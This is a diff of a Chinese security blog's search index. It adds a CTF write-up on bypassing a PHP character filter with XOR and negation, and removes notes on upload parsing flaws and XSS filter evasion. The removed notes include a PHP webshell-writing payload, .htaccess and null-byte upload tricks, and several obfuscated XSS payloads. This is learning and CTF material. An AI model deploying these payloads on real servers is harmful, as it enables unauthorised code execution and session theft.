+<p>将上面的php脚本运行之后生成一个txt文档，里面包含了所有字符的异或构造结果 </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\nyour input：&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
+<p>接着运行上面的python脚本即可，运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your input：guetctf</span><br><span class="line">&quot;%07%08%05%08%03%08%06&quot;^&quot;%60%7d%60%7c%60%7c%60&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="二、取反"><a href="#二、取反" class="headerlink" title="二、取反"></a>二、取反</h3><p>直接在命令行中运行这个php脚本即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;your input: &#x27;</span>);</span><br><span class="line"><span class="variable">$input</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*]&#x27;</span>.<span class="string">&#x27;~&#x27;</span>.urlencode(~<span class="variable">$input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your input: guetctf</span><br><span class="line">[*]~%98%8A%9A%8B%9C%8B%99</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>upload-labs</title>
     <url>/2022/01/27/upload-labs/</url>
     <content><![CDATA[<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01:"></a>Pass-01:</h1><p>查看源代码，不难发现，第一个属于前端<code>js</code>验证，有三种方法</p>
@@ -2872,160 +3026,6 @@
       <tags>
         <tag>web</tag>
         <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>解析漏洞</title>
-    <url>/2022/01/09/upload/</url>
-    <content><![CDATA[<h1 id="0x01-IIS5-x-6-0解析漏洞"><a href="#0x01-IIS5-x-6-0解析漏洞" class="headerlink" title="0x01 IIS5.x/6.0解析漏洞"></a>0x01 IIS5.x/6.0解析漏洞</h1><p>IIS6.0解析利用的方法有两种：</p>
-<ol>
-<li><p><strong>目录解析</strong></p>
-<p>在网站下建立文件夹名字为.<strong>asp</strong>、.<strong>asa</strong>的文件夹，其目录内的任何扩展名的文件都别IIS当作asp文件来解析并执行。例如创建目录<strong>pamela.asp</strong>，那么<strong>pamela.asp / 1.jpg</strong>将被当作asp文件来执行。</p>
-</li>
-<li><p><strong>文件解析</strong></p>
-<p>在IIS6.0下，分号后面的不被解析，也就是说pamela.asp;.jpg会被服务器看成是pamela.asp，还有        IIS6.0默认的可执行文件除了asp还包括这三种:</p>
-</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pamela.asa</span><br><span class="line">pamela.cer</span><br><span class="line">pamela.cdx</span><br></pre></td></tr></table></figure>
-<h1 id="0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞"></a>0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞</h1><p>在默认Fast-CGI开启状况下，上传一个名字为<strong>pamela.jpg</strong>，内容为</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval(&amp;_POST[cmd])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>的文件，然后访问<strong>pamela.jpg/.php</strong>，在这个目录下就会生成一句话木马<strong>shell.php</strong></p>
-<h1 id="0x03-Nginx-lt-8-03空字节代码执行漏洞"><a href="#0x03-Nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="0x03 Nginx&lt;8.03空字节代码执行漏洞"></a>0x03 Nginx&lt;8.03空字节代码执行漏洞</h1><ol>
-<li><p><strong>影响版本</strong>:</p>
-<p>0.5./0.6./0.7&lt;=0.7.65/0.8&lt;=0.8.37</p>
-</li>
-<li><p><strong>简介</strong></p>
-<p>Nginx在图片中嵌入php代码然后通过访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx.jpg%00.php</span><br></pre></td></tr></table></figure>
-<p>来执行其中的代码</p>
-</li>
-</ol>
-<h1 id="0x04-Apache解析漏洞"><a href="#0x04-Apache解析漏洞" class="headerlink" title="0x04 Apache解析漏洞"></a>0x04 Apache解析漏洞</h1><ol>
-<li><p><strong>背景</strong></p>
-<p>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p>
-</li>
-<li><p><strong>简介</strong></p>
-<p>比如<strong>pamela.php.owf.rar</strong> “<strong>.owf</strong>”和”<strong>.rar</strong>” 这两种后缀是 apache 不可识别解析,apache就会把<strong>pamela.php.owf.rar</strong>解析成 <strong>.php</strong></p>
-</li>
-<li><p><strong>利用</strong></p>
-<p>如何判断是不是合法的后缀就是这个漏洞的利用关键,<strong>pamela.php.rara.jpg.png…</strong>（把你知道的常见后缀都写上）去测试是否是合法后缀</p>
-</li>
-</ol>
-<h1 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h1><ol>
-<li><p>在Windows环境下，<strong>xx.jpg[空格]或xx.jpg</strong> 这两类文件是不允许存在的，若这样命名，Windows会默认去除空格和点，我们可以通过抓包，在文件名后加一个<strong>空格或者点</strong>来绕过黑名单，若上传成功，空格和点都会被Windows自动消除，这样也可以getshell</p>
-</li>
-<li><p>如果在apache中 <strong>.htaccess</strong>可被执行，且可被上传，那可以尝试在 .htaccess中写入：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">cimer</span>&quot;&gt;</span> </span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>然后再上传shell.jpg的木马，这样shell.jpg就可解析为php文件</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS各种绕过姿势</title>
-    <url>/2022/03/19/xss/</url>
-    <content><![CDATA[<h1 id="0x01-分类"><a href="#0x01-分类" class="headerlink" title="0x01 分类"></a>0x01 分类</h1><h2 id="1、反射型"><a href="#1、反射型" class="headerlink" title="1、反射型"></a>1、反射型</h2><p>也分为GET和POST两种，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p>
-<h2 id="2、存储型"><a href="#2、存储型" class="headerlink" title="2、存储型"></a>2、存储型</h2><p>持久化，代码是存储在服务器中的，如在个人信息、发表文章、发表评论等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。</p>
-<h2 id="3、DOM型"><a href="#3、DOM型" class="headerlink" title="3、DOM型"></a>3、DOM型</h2><p>不经过后端，基于文档对象模型的一种漏洞，它是通过url传入参数去控制触发的，其实也属于反射型。</p>
-<h1 id="0x02-绕过方法"><a href="#0x02-绕过方法" class="headerlink" title="0x02 绕过方法"></a>0x02 绕过方法</h1><h2 id="一、过滤关键字"><a href="#一、过滤关键字" class="headerlink" title="一、过滤关键字"></a>一、过滤关键字</h2><h3 id="1-1-大小写绕过"><a href="#1-1-大小写绕过" class="headerlink" title="1.1 大小写绕过"></a>1.1 大小写绕过</h3><p><code>&lt;a Href=&quot;JavasCript:aLert(&#39;xss&#39;)&quot;&gt;</code></p>
-<h3 id="1-2-双写关键字绕过"><a href="#1-2-双写关键字绕过" class="headerlink" title="1.2 双写关键字绕过"></a>1.2 双写关键字绕过</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过：</p>
-<p><code>&lt;a hhrefref=&quot;javascripscriptt:alert(&#39;xss&#39;)&quot;&gt;</code></p>
-<h3 id="1-3-字符串拼接"><a href="#1-3-字符串拼接" class="headerlink" title="1.3 字符串拼接"></a>1.3 字符串拼接</h3><ol>
-<li><p>通过利用eval函数：</p>
-<p><code>&lt;a href=&quot;a=&#39;javascri&#39;;b=&#39;pt:aler&#39;;c=&#39;t&#39;;d=&#39;(&#39;xss&#39;)&#39;;eval(a+b+c+d)&quot;&gt;</code></p>
-</li>
-<li><p>通过利用top函数：</p>
-<p><code>&lt;script&gt;top[&quot;ale&quot;+&quot;rt&quot;](&#39;xss&#39;)&lt;/script&gt;</code></p>
-</li>
-</ol>
-<h3 id="1-4-使用注释进行干扰绕过"><a href="#1-4-使用注释进行干扰绕过" class="headerlink" title="1.4 使用注释进行干扰绕过"></a>1.4 使用注释进行干扰绕过</h3><p><code>&lt;scri&lt;!--aaa--&gt;pt&gt;alert(123)&lt;/scri&lt;!--bbb--&gt;pt&gt;</code></p>
-<h3 id="1-5-编码绕过"><a href="#1-5-编码绕过" class="headerlink" title="1.5 编码绕过"></a>1.5 编码绕过</h3><ol>
-<li><p>Unicode编码绕过</p>
-<p><code>&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&quot;&gt;</code></p>
-<p><code>&lt;a href=&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029&quot;&gt;</code></p>
-</li>
-<li><p>url编码绕过</p>
-<p><code>&lt;a href=&quot;%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%78%73%73%27%29&quot;&gt;</code></p>
-</li>
-<li><p>Ascii码绕过</p>
-<p><code>&lt;a href=&quot;&quot;&gt;</code></p>
-</li>
-</ol>
-<h2 id="三、HttpOnly"><a href="#三、HttpOnly" class="headerlink" title="三、HttpOnly"></a>三、HttpOnly</h2><p>HttpOnly是Set-Cookie HTTP响应头中包含的<em>附加标志</em>，开启后如果检测到检测到包含HttpOnly标志的cookie，并且客户端脚本代码尝试读取cookie，则浏览器会返回一个空字符作为结果。这样可以防止恶意（通常是XSS）代码将数据发送到攻击者的网站，从而导致攻击失败。</p>
-<h3 id="3-1、绕过方法"><a href="#3-1、绕过方法" class="headerlink" title="3.1、绕过方法"></a>3.1、绕过方法</h3><ol>
-<li>浏览器未保存账号密码，需要xss产生登录地址，利用表单劫持</li>
-<li>浏览器保存密码，产生在后台的xss，存储型xss如留言等，浏览器读取账号密码</li>
-</ol>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>传输文件还原</title>
-    <url>/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/</url>
-    <content><![CDATA[<h1 id="一、配置环境"><a href="#一、配置环境" class="headerlink" title="一、配置环境"></a>一、配置环境</h1><p>将手机和PC连到同一子网下（如GUET-WiFi）</p>
-<p>手机IP：<code>10.33.80.238</code></p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/1.png" alt></p>
-<p>PC的IP：<code>10.33.35.83</code></p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/2.png" alt></p>
-<h1 id="二、WireShark抓包"><a href="#二、WireShark抓包" class="headerlink" title="二、WireShark抓包"></a>二、WireShark抓包</h1><p>打开WireShark，选择WLAN过滤器</p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/3.png" alt></p>
-<p>然后在过滤出resource IP是手机IP的数据包：<code>ip.src == 10.33.80.238</code></p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/4.png" alt></p>
-<p>通过QQ从手机发送一张图片给PC，此时WireShark会截获大量数据包，找到其中一个是HTTP协议的数据包</p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/5.png" alt></p>
-<p>右键单击然后选择追踪TCP流</p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/6.png" alt></p>
-<p>然后在下面展示数据的格式中选择原始数据（raw data）</p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/7.png" alt></p>
-<p>然后将这些原始数据另存为一个新文件即可</p>
-<h1 id="三、还原文件"><a href="#三、还原文件" class="headerlink" title="三、还原文件"></a>三、还原文件</h1><p>用十六进制编辑器（010 Editor）打开该文件，找到图片的十六进制文件头（FFD8FF）</p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/8.png" alt></p>
-<p>然后删除该文件头之前的所有数据</p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/9.png" alt></p>
-<p>然后保存，修改文件后缀名为图片格式（jpg）即可成功打开该图片</p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/10.png" alt></p>
-]]></content>
-      <categories>
-        <category>基础知识和笔记</category>
-      </categories>
-      <tags>
-        <tag>learn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2021 GUET梦极光杯</title>
-    <url>/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<p>有一道web题，源码如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[A-Za-z0-9;()]/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo &quot;</span> . <span class="variable">$code</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_clean();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> === <span class="string">&quot;guetctf&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>很明显可以看到我们要构造 <strong>‘ code=guetctf ’</strong> 才能解开，但是正则表达式把所有的字母和数字都过滤掉了，因此我们要通过其他方法来进行绕过</p>
-<h3 id="一、异或"><a href="#一、异或" class="headerlink" title="一、异或"></a>一、异或</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[A-Za-z0-9;()]/i&#x27;</span>; <span class="comment">//可以根据题目给的正则表达式进行修改</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)^urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>将上面的php脚本运行之后生成一个txt文档，里面包含了所有字符的异或构造结果 </p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\nyour input：&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
-<p>接着运行上面的python脚本即可，运行结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your input：guetctf</span><br><span class="line">&quot;%07%08%05%08%03%08%06&quot;^&quot;%60%7d%60%7c%60%7c%60&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="二、取反"><a href="#二、取反" class="headerlink" title="二、取反"></a>二、取反</h3><p>直接在命令行中运行这个php脚本即可</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;your input: &#x27;</span>);</span><br><span class="line"><span class="variable">$input</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*]&#x27;</span>.<span class="string">&#x27;~&#x27;</span>.urlencode(~<span class="variable">$input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>运行结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your input: guetctf</span><br><span class="line">[*]~%98%8A%9A%8B%9C%8B%99</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
